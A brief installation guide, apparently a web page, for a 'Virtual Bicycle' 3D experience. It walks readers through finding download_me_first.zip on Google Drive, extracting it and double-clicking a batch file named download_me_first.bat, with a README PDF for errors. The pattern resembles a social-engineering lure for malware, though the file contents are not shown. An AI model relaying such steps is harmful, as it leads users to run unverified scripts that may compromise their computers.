Installation Guide

Virtual Bicycle Setup

Follow the steps below to download and launch your interactive 3D bicycle experience.

Step 1: Open the Link

Click the button below. It will redirect you to Google Drive.

Step 2: Search for the File

After opening Drive, search for the file named download_me_first.zip.

Step 3: Download to Desktop

Download the file to your Desktop.

Step 4: Extract the ZIP

Extract the ZIP file on your desktop.

Step 5: Run the Installer

Open the extracted folder and double-click the file named download_me_first.bat.

Step 6: Troubleshoot if Needed

If any error occurs, open the PDF named README located in the same folder for troubleshooting instructions.
